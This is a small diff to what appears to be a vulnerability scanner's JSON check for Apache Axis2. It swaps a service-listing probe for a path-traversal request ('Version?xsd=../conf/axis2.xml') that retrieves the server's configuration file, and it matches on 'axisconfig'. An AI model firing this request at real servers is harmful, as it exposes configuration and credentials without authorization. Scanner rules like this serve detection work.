@@ -4,12 +4,12 @@
     "port": [
         8080
     ],
-    "dork":"apps=Java",
+    "dork": "apps=Java",
     "suffix": [
-        "/axis2/services/listServices"
+        "/axis2/services/Version?xsd=../conf/axis2.xml"
     ],
     "hits": [
-        "Available services"
+        "axisconfig"
     ],
     "references": [
         "https://www.exploit-db.com/exploits/12721/"
